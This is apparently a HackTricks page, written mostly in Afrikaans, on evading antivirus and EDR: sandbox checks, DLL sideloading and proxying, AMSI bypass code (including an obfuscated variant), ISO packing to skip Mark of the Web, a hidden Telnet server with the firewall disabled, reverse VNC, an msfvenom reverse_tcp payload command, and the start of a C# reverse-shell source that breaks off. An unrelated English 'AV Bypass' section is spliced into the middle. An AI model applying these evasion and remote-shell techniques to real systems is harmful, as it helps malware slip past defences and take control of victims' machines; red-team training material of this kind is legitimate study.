# Antivirus (AV) Deurloop

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

**Hierdie bladsy is geskryf deur** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **AV Ontduiking Metodologie**

Tans gebruik AV's verskillende metodes om te bepaal of 'n lêer skadelik is of nie, statiese opsporing, dinamiese analise, en vir die meer gevorderde EDR's, gedragsanalise.

### **Statiese opsporing**

Statiese opsporing word bereik deur bekende skadelike strings of reekse van bytes in 'n binêre of skripsie te merk, en ook deur inligting uit die lêer self te onttrek (bv. lêerbeskrywing, maatskappy naam, digitale handtekening, ikoon, kontrolegetal, ens.). Dit beteken dat die gebruik van bekende openbare gereedskap jou makliker kan verraai, aangesien hulle waarskynlik geanaliseer en as skadelik geïdentifiseer is. Daar is 'n paar maniere om hierdie soort opsporing te omseil:

* **Versleuteling**

As jy die binêre lêer versleutel, sal daar geen manier wees vir die AV om jou program op te spoor nie, maar jy sal 'n soort laaier benodig om die program in die geheue te ontsluit en uit te voer.

* **Obfuskasie**

Soms hoef jy net 'n paar strings in jou binêre of skripsie te verander om dit verby die AV te kry, maar dit kan 'n tydrowende taak wees, afhangende van wat jy probeer obfuskasieer.

* **Aangepaste gereedskap**

As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

{% hint style="info" %}
'n Goeie manier om teen Windows Defender se statiese opsporing te toets, is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel die lêer in verskeie segmente en laat dan Defender toe om elkeen afsonderlik te skandeer. Op hierdie manier kan dit jou presies vertel watter strings of bytes in jou binêre geïdentifiseer is.
{% endhint %}

Ek beveel sterk aan dat jy hierdie [YouTube-afspeellys](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV-ontduiking kyk.

### **Dinamiese analise**

Dinamiese analise is wanneer die AV jou binêre lêer in 'n sandboks uitvoer en kyk vir skadelike aktiwiteit (bv. probeer om jou webblaaier se wagwoorde te ontsluit en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie gedeelte kan 'n bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandbokse te ontduik.

* **Wag voor uitvoering** Afhangende van hoe dit geïmplementeer is, kan dit 'n goeie manier wees om AV se dinamiese analise te omseil. AV's het 'n baie kort tyd om lêers te skandeer om nie die gebruiker se werkstroom te onderbreek nie, so deur lang wagtye te gebruik, kan dit die analise van binêre lêers versteur. Die probleem is dat baie AV-sandbokse die wagtyd kan ignoreer, afhangende van hoe dit geïmplementeer is.
* **Kontroleer van masjien se hulpbronne** Gewoonlik het sandbokse baie min hulpbronne tot hul beskikking (bv. < 2 GB RAM), anders kan dit die gebruiker se masjien vertraag. Jy kan ook baie kreatief wees hier, byvoorbeeld deur die CPU se temperatuur of selfs die spoed van die waaiers te kontroleer, nie alles sal in die sandboks geïmplementeer word nie.
* **Spesifieke masjienkontroles** As jy 'n gebruiker wil teiken wie se werkstasie by die "contoso.local" domein aangesluit is, kan jy 'n kontrole op die rekenaar se domein doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het. As dit nie ooreenstem nie, kan jy jou program laat afsluit.

Dit blyk dat die rekenaarnaam van Microsoft Defender se Sandboks HAL9TH is, so jy kan die rekenaarnaam in jou skadelike sagteware nagaan voordat dit ontplof. As die naam ooreenstem met HAL9TH, beteken dit dat jy binne die verdediger se sandboks is, sodat jy jou program kan laat afsluit.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

'n Paar ander baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die stryd teen Sandbokse

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons voorheen in hierdie pos genoem het, sal **openbare gereedskap** uiteindelik **opgespoor** word, dus moet jy jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy werklik mimikatz gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump.

Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as 'n voorbeeld, dit is waarskynlik een van, indien nie die mees geïdentifiseerde stukke skadelike sagteware deur AV's en EDR's, terwyl die projek self baie cool is, is dit ook 'n nagmerrie om daarmee te werk om AV's te omseil, soek dus net na alternatiewe vir wat jy wil bereik.

{% hint style="info" %}
Wanneer jy jou payloads vir ontduiking wysig, maak seker dat jy **outomatiese monsterindiening** in verdediger **afskakel**, en asseblief, ernstig, **LAAT NIE OP VIRUSTOTAL OPLAAD** as jou doel is om ontduiking op die lang termyn te bereik nie. As jy wil nagaan of jou payload deur 'n bepaalde AV opgespoor word, installeer dit op 'n VM, probeer om die outomatiese monsterindiening af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.
{% endhint %}

## EXE's vs DLL's

Wanneer dit moontlik is, **prioritiseer altyd die gebruik van DLL's vir ontduiking**, in my ervaring word DLL-lêers gewoonlik **baie minder opgespoor** en geanaliseer, so dit is 'n baie eenvoudige truuk om te gebruik om
## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL-soekvolgorde wat deur die laaier gebruik word deur beide die slagoffer-toepassing en die kwaadwillige vragte langs mekaar te plaas.

Jy kan programme wat vatbaar is vir DLL Sideloading nagaan deur [Siofra](https://github.com/Cybereason/siofra) en die volgende PowerShell-skrips te gebruik:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie bevel sal die lys van programme wat vatbaar is vir DLL-ontvoering binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitvoer.

Ek beveel sterk aan dat jy **DLL-ontvoerbare/-syloadeerbare programme self verken**, hierdie tegniek is redelik sluipend as dit behoorlik gedoen word, maar as jy openlik bekende DLL-syloadeerbare programme gebruik, kan jy maklik gevang word.

Deur net 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai, te plaas, sal jou lading nie laai nie, aangesien die program verwag dat daar sekere funksies binne daardie DLL is. Om hierdie probleem op te los, sal ons 'n ander tegniek gebruik wat **DLL-proksiëring/-deurverwysing** genoem word.

**DLL-proksiëring** stuur die oproepe wat 'n program maak vanaf die proksi (en kwaadwillige) DLL na die oorspronklike DLL, en behou dus die funksionaliteit van die program en kan die uitvoering van jou lading hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Hier is die stappe wat ek gevolg het:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste bevel sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Hierdie is die resultate:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (gekodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 opsporingskoers in [antiscan.me](https://antiscan.me)! Ek sal dit 'n sukses noem.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec se video](https://www.youtube.com/watch?v=3eROsG\_WNpE) om meer te leer oor wat ons in meer diepte bespreek het.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n nut vir ladingstukke om EDRs te omseil deur gesuspendeerde prosesse, direkte syscalls en alternatiewe uitvoeringsmetodes te gebruik`

Jy kan Freeze gebruik om jou shellcode op 'n sluipende manier te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Ontduiking is net 'n kat-en-muis-speletjie, wat vandag werk, kan môre opgespoor word, so moenie net op een instrument staatmaak nie, as moontlik, probeer om verskeie ontduikingstegnieke aan mekaar te koppel.
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)" te voorkom. Aanvanklik kon AV's slegs **lêers op skyf** skandeer, so as jy op een of ander manier vuisladinge **direk in die geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in hierdie komponente van Windows.

* Gebruikersrekeningbeheer, of UAC (verhoging van EXE, COM, MSI, of ActiveX-installasie)
* PowerShell (skripte, interaktiewe gebruik, en dinamiese kode-evaluering)
* Windows Script Host (wscript.exe en cscript.exe)
* JavaScript en VBScript
* Office VBA-makros

Dit stel antivirus-oplossings in staat om skripsiegedrag te ondersoek deur skripsie-inhoud bloot te stel in 'n vorm wat beide onversleuteld en onversluierd is.

As jy `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` uitvoer, sal dit die volgende waarskuwing op Windows Defender produseer.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Let daarop hoe dit `amsi:` voorvoeg en dan die pad na die uitvoerbare lêer waaruit die skripsie uitgevoer is, in hierdie geval powershell.exe

Ons het geen lêer na skyf gelaai nie, maar is steeds in die geheue gevang as gevolg van AMSI.

Daar is 'n paar maniere om AMSI te omseil:

* **Versluiering**

Aangesien AMSI hoofsaaklik met statiese opsporings werk, kan die wysiging van die skrippe wat jy probeer laai, 'n goeie manier wees om opsporing te ontduik.

Tog het AMSI die vermoë om skrippe te ontsluier, selfs as dit meerdere lae het, so versluiering kan 'n slegte opsie wees, afhangende van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontduik nie. Alhoewel, soms hoef jy net 'n paar veranderlikes se name te verander en dan is jy reg, so dit hang af van hoeveel iets geïdentifiseer is.

* **AMSI-omseiling**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer, selfs as 'n onbevoorregte gebruiker. As gevolg van hierdie fout in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forseer 'n Fout**

Deur die AMSI-inisialisering te dwing om te misluk (amsiInitFailed), sal dit daartoe lei dat geen skandering vir die huidige proses geïnisieer word nie. Aanvanklik is dit bekendgemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n handtekening ontwikkel om breër gebruik te voorkom.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Al wat dit geneem het, was een lyn van Powershell-kode om AMSI onbruikbaar te maak vir die huidige Powershell-proses. Hierdie lyn is natuurlik deur AMSI self geïdentifiseer, so 'n aanpassing is nodig om hierdie tegniek te gebruik.

Hier is 'n aangepaste AMSI-omseiling wat ek geneem het van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat hierdie pos waarskynlik geïdentifiseer sal word sodra dit uitkom, so jy moet geen kode publiseer as jou plan is om onopgespoor te bly nie.

**Geheue-aanpassing**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/\_RastaMouse/) en dit behels die vind van die adres vir die "AmsiScanBuffer" funksie in amsi.dll (verantwoordelik vir die skandering van die gebruiker se inset) en dit oorskryf met instruksies om die kode vir E\_INVALIDARG terug te gee. Op hierdie manier sal die resultaat van die werklike skandering as 0 geïnterpreteer word, wat as 'n skoon resultaat beskou word.

{% hint style="info" %}
Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.
{% endhint %}

Daar is ook baie ander tegnieke wat gebruik word om AMSI met PowerShell te omseil, kyk na [**hierdie bladsy**](basic-powershell-for-pentesters/#amsi-bypass) en [hierdie bewaarplek](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

Of hierdie skripsie wat deur geheue-aanpassing elke nuwe Powershell sal aanpas

## Verduistering

Daar is verskeie hulpmiddels wat gebruik kan word om **C#-kode in duidelike teks te verduister**, **metaprogrammeringstemplates** te genereer om binnerwerke te kompileer of **gekompileerde binnerwerke te verduister**, soos:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-verduisteraar**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n oopbron-afsplitsing van die [LLVM](http://www.llvm.org/) samestellingssuite te voorsien wat verhoogde sagtewarebeveiliging kan bied deur middel van [kodeverduistering](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) en onveranderlikheid.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om `C++11/14`-taal te gebruik om, tydens kompileertyd, verduisterde kode te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die samesteller te wysig.
* [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van verduisterde bewerkings by wat gegenereer word deur die C++-templaatmetaprogrammeringsraamwerk, wat die lewe van die persoon wat die aansoek wil kraak, 'n bietjie moeiliker sal maak.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64-binêre verduisteraar wat verskillende pe-lêers, insluitend: .exe, .dll, .sys, kan verduister
* [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorfiese kode-enjin vir willekeurige uitvoerbare lêers.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige kodeverduisteringsraamwerk vir LLVM-ondersteunde tale wat ROP (return-oriented programming) gebruik. ROPfuscator verduister 'n program op die vlak van die samestellingkode deur gewone instruksies in ROP-reekse te omskep, wat ons natuurlike konsepsie van normale beheerstroom verhinder.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL omskakel na skulpkode en dit dan laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sekere uitvoerbare lêers van die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoer van potensieel skadelike aansoeke.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat ongewone aflaaiaansoeke SmartScreen sal aktiveer en sodoende die eindgebruiker waarsku en verhoed dat die lêer uitgevoer word (hoewel die lêer steeds uitgevoer kan word deur op Meer inligting -> Toch uitvoer te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternatiewe Datastroom](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers van die internet afgelaai word, saam met die URL waarvan dit afgelaai is.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat van die internet afgelaai is.</p></figcaption></figure>

{% hint style="info" %}
Dit is belangrik om daarop te let dat uitvoerbare lêers wat onderteken is met 'n **vertroude** ondertekeningssertifikaat **nie SmartScreen sal aktiveer** nie.
{% endhint %}

'n Baie effektiewe manier om te voorkom dat jou lading die Mark of The Web kry, is deur dit binne 'n soort houer soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **nie-NTFS**-volumes toegepas kan word nie.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat ladinge in uitvoerhouers verpak om die Mark of The Web te omseil.

Voorbeeldgebruik:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demonstrasie om SmartScreen te omseil deur vullastings binne ISO-lêers te verpak met behulp van [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# Monteer Refleksie

Die laai van C# binêre lêers in die geheue is al 'n geruime tyd bekend en dit is steeds 'n baie goeie manier om jou post-exploitation-gereedskap uit te voer sonder om deur AV gevang te word.

Aangesien die vullasting direk in die geheue gelaai sal word sonder om die skyf aan te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2-raamwerke (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# monteerstukke direk in die geheue uit te voer, maar daar is verskillende maniere om dit te doen:

* **Fork\&Run**

Dit behels die **spawn van 'n nuwe offerproses**, inspuiting van jou post-exploitation kwaadwillige kode in daardie nuwe proses, uitvoering van jou kwaadwillige kode en wanneer dit klaar is, doodmaak van die nuwe proses. Dit het voordele en nadele. Die voordeel van die vork- en uitvoermetode is dat die uitvoering plaasvind **buite** ons Beacon-implantproses. Dit beteken dat as iets in ons post-exploitation-aksie verkeerd gaan of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om gevang te word deur **Gedragsopsporing**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Dit gaan daaroor om die post-exploitation kwaadwillige kode **in sy eie proses** in te spuit. Op hierdie manier kan jy voorkom dat jy 'n nuwe proses moet skep en dit deur AV laat skandeer, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou vullading, daar 'n **veel groter kans** is dat jy jou beacon **verloor** omdat dit kan afkraak.

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
As jy meer wil lees oor C# Monteer laai, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Jy kan ook C# Monteerstukke **vanuit PowerShell** laai, kyk na [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) en [S3cur3th1sSh1t se video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Die gebruik van ander programmeertale

Soos voorgestel in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), is dit moontlik om kwaadwillige kode uit te voer deur ander tale te gebruik deur die gekompromitteerde masjien toegang te gee **tot die tolk-omgewing wat op die Aanvaller Beheerde SMB-aandeel geïnstalleer is**.&#x20;

Deur toegang tot die tolk-binêre lêers en die omgewing op die SMB-aandeel toe te laat, kan jy **arbitrêre kode binne die geheue** van die gekompromitteerde masjien uitvoer.

Die repo dui aan: Verdediger skandeer steeds die skripte, maar deur gebruik te maak van Go, Java, PHP ens. het ons **meer buigsaamheid om statiese handtekeninge te omseil**. Toetsing met lukrake ongeobfuskeerde omgekeerde skulskrifskripte in hierdie tale was suksesvol.

## Gevorderde Ontduiking

Ontduiking is 'n baie ingewikkelde onderwerp, soms moet jy rekening hou met baie verskillende bronne van telemetrie in net een stelsel, so dit is baie moeilik om heeltemal onopgespoor te bly in volwasse omgewings.

Elke omgewing waarteen jy te staan kom, sal hul eie sterkpunte en swakhede hê.

Ek moedig jou sterk aan om na hierdie praatjie van [@ATTL4S](https://twitter.com/DaniLJ94) te kyk om 'n voet in die deur te kry vir meer gevorderde ontduikingstegnieke.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Dit is ook 'n ander goeie praatjie van [@mariuszbit](https://twitter.com/mariuszbit) oor Ontduiking in Diepte.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Ou Tegnieke**

### **Kyk watter dele Defender as kwaadwillig beskou**

Jy kan [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) gebruik wat dele van die binêre lêer sal **verwyder** totdat dit **uitvind watter deel Defender** as kwaadwillig beskou en dit aan jou verdeel.\
'n Ander hulpmiddel wat dieselfde ding doen, is [**avred**](https://github.com/dobin/avred) met 'n oop web wat die diens aanbied in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet-bediener**

Tot Windows10 het alle Windows met 'n **Telnet-bediener** gekom wat jy kon installeer (as administrateur) deur die volgende te doen:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Maak dit **begin** wanneer die stelsel begin en **voer** dit nou uit:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet-poort** (stealth) en deaktiveer vuurmuur:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die binêre aflaai, nie die opstelling nie)

**OP DIE GASHEER**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:

* Skakel die opsie _Disable TrayIcon_ aan
* Stel 'n wagwoord in vir _VNC Password_
* Stel 'n wagwoord in vir _View-Only Password_

Skuif dan die binêre _**winvnc.exe**_ en die nuut geskepte lêer _**UltraVNC.ini**_ binne die **slagoffer**

#### **Omgekeerde verbinding**

Die **aanvaller** moet binne sy **gasheer** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit **gereed** is om 'n omgekeerde **VNC-verbinding** te vang. Dan, binne die **slagoffer**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <aanvaller_ip>::5900` uit

**WAARSKUWING:** Om onsigbaar te bly, moet jy 'n paar dinge nie doen nie

* Moenie `winvnc` begin as dit reeds loop nie, anders sal jy 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. Kyk of dit loop met `tasklist | findstr winvnc`
* Moenie `winvnc` sonder `UltraVNC.ini` in dieselfde gids begin nie, anders sal dit [die konfigurasie-venster](https://i.imgur.com/rfMQWcf.png) oopmaak
* Moenie `winvnc -h` vir hulp uitvoer nie, anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:

# AV Bypass

## Introduction

In this section, we will discuss various techniques to bypass antivirus (AV) software. These techniques are commonly used by hackers to evade detection and execute malicious code on a target system.

## 1. Encoding

Encoding is a technique used to modify the structure of a file or code without changing its functionality. By encoding a malicious payload, we can bypass AV detection as the encoded payload appears different from the original.

### Base64 Encoding

Base64 encoding is a common method used to encode data. By encoding a payload using Base64, we can obfuscate the malicious code and bypass AV detection.

To encode a payload using Base64, we can use the following command:

```plaintext
echo -n "payload" | base64
```

### Hex Encoding

Hex encoding is another technique used to encode data. By converting the payload to hexadecimal format, we can bypass AV detection.

To encode a payload using hex, we can use the following command:

```plaintext
echo -n "payload" | xxd -p
```

## 2. Packing

Packing is a technique used to compress or encrypt a file or code. By packing a malicious payload, we can bypass AV detection as the packed payload appears different from the original.

### UPX Packing

UPX (Ultimate Packer for eXecutables) is a popular tool used to pack executable files. By packing a payload using UPX, we can bypass AV detection.

To pack a payload using UPX, we can use the following command:

```plaintext
upx -9 -o packed_payload.exe original_payload.exe
```

### Crypters

Crypters are tools used to encrypt and pack malicious payloads. By using crypters, we can bypass AV detection as the encrypted and packed payload appears different from the original.

## 3. Metasploit Framework

The Metasploit Framework is a powerful tool used by hackers for penetration testing and exploiting vulnerabilities. It also provides various techniques to bypass AV detection.

### Meterpreter Payloads

Meterpreter is a payload used by the Metasploit Framework. By using Meterpreter payloads, we can bypass AV detection as Meterpreter has built-in AV evasion techniques.

To generate a Meterpreter payload, we can use the following command:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe > payload.exe
```

## Conclusion

Bypassing AV detection is crucial for hackers to successfully execute their malicious activities. By using encoding, packing, and tools like the Metasploit Framework, hackers can evade detection and compromise target systems. It is important for organizations to implement strong security measures to protect against these techniques.
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Begin de lysmaker met `msfconsole -r file.rc` en voer die XML-payload uit met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Die huidige verdediger sal die proses baie vinnig beëindig.**

### Kompilering van ons eie omgekeerde dop

https://medium.com/@Bank\_Security/ondetecteerbare-c-c-omgekeerde-doppe-fab4c0ec4f15

#### Eerste C# Omgekeerde dop

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
